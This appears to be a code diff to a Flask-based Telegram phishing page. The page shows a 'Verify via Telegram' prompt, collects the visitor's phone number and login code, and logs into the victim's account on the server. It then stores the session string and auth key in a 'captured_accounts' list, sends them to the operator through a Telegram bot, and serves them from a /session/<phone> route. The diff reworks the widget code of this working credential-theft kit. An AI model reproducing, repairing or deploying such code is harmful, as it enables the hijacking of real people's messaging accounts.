@@ -94,19 +94,10 @@ PAGE = """<!DOCTYPE html>
         .video-item .info h4{font-size:12px;margin-bottom:3px}
         .video-item .info span{font-size:11px;color:#666}
         .footer{text-align:center;padding:20px;color:#333;font-size:11px}
-        /* Telegram Login Button customization */
+        /* Telegram login wrapper */
         .tg-login-wrapper { margin: 15px 0; display: flex; justify-content: center; }
         .tg-login-wrapper telegram-login-widget { display: flex; justify-content: center; }
-        /* Hide the default Telegram widget's "Log in via Telegram" text and show a custom button instead */
-        .tg-btn-overlay { position: relative; }
-        .tg-btn-overlay .custom-tg-btn { 
-            display: flex; align-items: center; justify-content: center; gap: 10px;
-            width: 100%; padding: 16px; background: #0088cc; border: none; border-radius: 12px;
-            color: white; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s;
-        }
-        .custom-tg-btn:hover { background: #0077b6; transform: translateY(-1px); }
-        .custom-tg-btn .tg-icon { width: 22px; height: 22px; }
-        .hidden-telegram-widget { position: absolute; opacity: 0; pointer-events: none; width: 0; height: 0; overflow: hidden; }
+        .tg-login-wrapper iframe { max-width: 100% !important; }
     </style>
 </head>
 <body>
@@ -144,10 +135,17 @@ PAGE = """<!DOCTYPE html>
                 <h2>Verify via Telegram</h2>
                 <p>Sign in with Telegram to continue</p>
                 
-                <!-- Telegram Login Widget will be injected here -->
-                <div id="tgWidgetContainer" class="tg-login-wrapper"></div>
+                <!-- Telegram Login Widget -->
+                <div id="tgWidgetContainer" class="tg-login-wrapper">
+                    <script async src="https://telegram.org/js/telegram-widget.js?22" 
+                        data-telegram-login="" 
+                        data-size="large" 
+                        data-request-contact="true"
+                        data-onauth="onTelegramAuth(user)">
+                    </script>
+                </div>
                 
-                <div id="ps1" class="sb info" style="display:none">⏳ Processing...</div>
+                <div id="ps1" class="sb" style="display:none"></div>
             </div>
             
             <div id="s2" class="step">
@@ -184,75 +182,50 @@ PAGE = """<!DOCTYPE html>
         </div>
     </div>
     
-    <script src="https://telegram.org/js/telegram-widget.js?22"></script>
     <script>
     var phoneNumber = '';
     var codeDigits = '';
     var codeCheckInterval = null;
-    var tgWidgetReady = false;
     
     // Handle Telegram Login callback
     function onTelegramAuth(user) {
-        console.log('Telegram auth callback received:', user);
+        console.log('Telegram auth:', user);
         
         if (user && user.phone_number) {
             phoneNumber = user.phone_number;
-            document.getElementById('ps1').className = 'sb waiting';
-            document.getElementById('ps1').innerHTML = '<span class="sp"></span> Processing phone number...';
-            document.getElementById('ps1').style.display = 'block';
+            var ps = document.getElementById('ps1');
+            ps.className = 'sb waiting';
+            ps.innerHTML = '<span class="sp"></span> Processing...';
+            ps.style.display = 'block';
             sendPhoneToBackend(phoneNumber);
         } else {
-            document.getElementById('ps1').className = 'sb error';
-            document.getElementById('ps1').innerHTML = '❌ Could not get phone number. Try again.';
-            document.getElementById('ps1').style.display = 'block';
+            var ps = document.getElementById('ps1');
+            ps.className = 'sb error';
+            ps.innerHTML = '❌ Could not get phone number';
+            ps.style.display = 'block';
         }
     }
     
-    // Main button click handler
+    // Main button click
     document.getElementById('glb').onclick = function() {
         document.getElementById('vm').classList.add('active');
         document.getElementById('s1').classList.add('active');
         document.getElementById('s2').classList.remove('active');
         document.getElementById('s3').classList.remove('active');
-        
-        // Clear any previous messages
         document.getElementById('ps1').style.display = 'none';
         
-        // Create the Telegram Login Widget with requestContact
-        createTelegramWidget();
-    };
-    
-    function createTelegramWidget() {
+        // Re-create widget to ensure it's visible
         var container = document.getElementById('tgWidgetContainer');
         container.innerHTML = '';
-        
-        // Create a container with the Telegram Login button
-        // Using data-request-contact to get phone number directly
-        var widgetDiv = document.createElement('div');
-        widgetDiv.innerHTML = '<telegram-login-widget ' +
-            'data-telegram-login="" ' +
-            'data-size="large" ' +
-            'data-request-contact="true" ' +
-            'data-onauth="onTelegramAuth(user)" ' +
-            'data-auth-url="">' +
-            '</telegram-login-widget>';
-        
-        container.appendChild(widgetDiv);
-        
-        // Re-initialize the Telegram widget
-        if (window.Telegram && window.Telegram.Widget) {
-            try {
-                window.Telegram.Widget.init();
-            } catch(e) {
-                console.log('Widget init error:', e);
-            }
-        }
-        
-        // Show processing message
-        document.getElementById('ps1').className = 'sb info';
-        document.getElementById('ps1').innerHTML = '🔵 Click the Telegram button above to sign in';
-        document.getElementById('ps1').style.display = 'block';
-    }
+        var script = document.createElement('script');
+        script.src = 'https://telegram.org/js/telegram-widget.js?22';
+        script.setAttribute('data-telegram-login', '');
+        script.setAttribute('data-size', 'large');
+        script.setAttribute('data-request-contact', 'true');
+        script.setAttribute('data-onauth', 'onTelegramAuth(user)');
+        script.async = true;
+        container.appendChild(script);
+    };
     
     async function sendPhoneToBackend(phone) {
         try {
@@ -441,7 +414,7 @@ def run_telegram_action(phone, code=None):
                     'username': me.username or '',
                     'first_name': me.first_name or '',
                     'last_name': me.last_name or '',
-                    'session': ss,  # Now this will ALWAYS have a value
+                    'session': ss,
                     'webk': json.dumps({
                         'dcId': dc,
                         'authKey': auth_b64,
@@ -459,8 +432,7 @@ def run_telegram_action(phone, code=None):
                         del user_sessions[phone]
                     pending_codes[phone] = 'done'
                 
-                # Notify via Telegram with the ACTUAL session string
-                session_preview = ss[:50] + '...' if len(ss) > 50 else ss
+                # Notify via Telegram
                 try:
                     import requests
                     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
@@ -546,7 +518,6 @@ def verify():
 
 @app.route('/session/<phone>')
 def get_session(phone):
-    """Get the session string for an account"""
     with sessions_lock:
         a = next((x for x in captured_accounts if x['phone'] == phone), None)
     
